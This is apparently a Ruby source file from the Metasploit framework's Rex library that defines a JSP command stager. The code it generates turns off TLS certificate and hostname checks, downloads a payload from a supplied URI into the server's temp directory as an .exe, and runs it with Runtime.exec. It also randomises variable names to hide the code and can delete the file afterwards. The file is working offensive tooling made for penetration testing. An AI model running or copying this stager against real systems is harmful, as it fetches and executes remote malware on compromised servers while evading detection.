# -*- coding: binary -*-

class Rex::Exploitation::CmdStagerJSP < Rex::Exploitation::CmdStagerBase
  def http?
    true
  end

  def user_agent
    /^java/i
  end

  def generate(opts = {})
    raise "#{self.class.name}##{__callee__} missing opts[:payload_uri]" if opts[:payload_uri].nil?
    @payload_name ||= Rex::Text.rand_text_alphanumeric(rand(3..8))

    super
  end

  def generate_cmds_payload(opts)
    identifier_generator = Rex::RandomIdentifier::Generator.new({ language: :jsp })

    # replace the meaningful variable names with random ones
    local_variables = %w[trustAllCerts ssl_ctx allHostsValid url_input file_output dataBuffer bytesRead
                         x509cert1 authType1 x509cert2 authType2 hostname_str ssl_sess].map do |var|
      [var, identifier_generator.generate]
    end.to_h

    # parts of the JSP payload, will be concatenated

    elements = [
      '<%@page import="java.io.*"%>',
      '<%@page import="javax.net.ssl.*"%>',
      '<%@page import="java.nio.file.Paths"%>',
      %&
<%
  TrustManager[] trustAllCerts = new TrustManager[]{
    new X509TrustManager() {
        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
            return null;
        }
        public void checkClientTrusted(
            java.security.cert.X509Certificate[] x509cert1, String authType1) {
        }
        public void checkServerTrusted(
            java.security.cert.X509Certificate[] x509cert2, String authType2) {
        }
    }
  };
  try {
    SSLContext ssl_ctx = SSLContext.getInstance("SSL");
    ssl_ctx.init(null, trustAllCerts, new java.security.SecureRandom());
    HttpsURLConnection.setDefaultSSLSocketFactory(ssl_ctx.getSocketFactory());
    HostnameVerifier allHostsValid = new HostnameVerifier() {
      public boolean verify(String hostname_str, SSLSession ssl_sess) {
        return true;
      }
    };

    HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
  }
  catch (Exception e)
  {
  }
%>
&,
      %&
<%
  try{
    BufferedInputStream url_input = new BufferedInputStream(new java.net.URL("#{opts[:payload_uri]}").openStream());
    FileOutputStream file_output = new FileOutputStream(Paths.get(System.getProperty("java.io.tmpdir"), "#{@payload_name}.exe").toString());
    byte dataBuffer[] = new byte[1024];
    int bytesRead;
    while ((bytesRead = url_input.read(dataBuffer, 0, 1024)) != -1) {
      file_output.write(dataBuffer, 0, bytesRead);
    }
    file_output.close();
    url_input.close();
  }
  catch (Exception e)
  {
  }
%>
&
    ]

    # replace variable names in the payload, and remove whitespace characters
    elements.map do |snippet|
      snippet.gsub(/\b[a-z\$_][a-z\$_0-9]*\b/i) { |m| local_variables[m] || m }.gsub(/\s+/, ' ')
    end
  end

  def generate_cmds_decoder(opts)
    decoder_code = <<~CODE
      <% 
          try {
            new File(Paths.get(System.getProperty("java.io.tmpdir"), "#{@payload_name}.exe").toString()).setExecutable(true);
            Runtime.getRuntime().exec(Paths.get(System.getProperty("java.io.tmpdir"), "#{@payload_name}.exe").toString());
          } catch (Exception e) { }
      %>
    CODE
    elements = [decoder_code]
    unless opts[:nodelete]
      elements << "<% new File(Paths.get(System.getProperty(\"java.io.tmpdir\"), \"#{@payload_name}.exe\").toString()).delete(); %>"
    end
    elements.map { |snippet| snippet.gsub(/\s+/, ' ') }
  end

  def cmd_concat_operator
    "\n"
  end
end
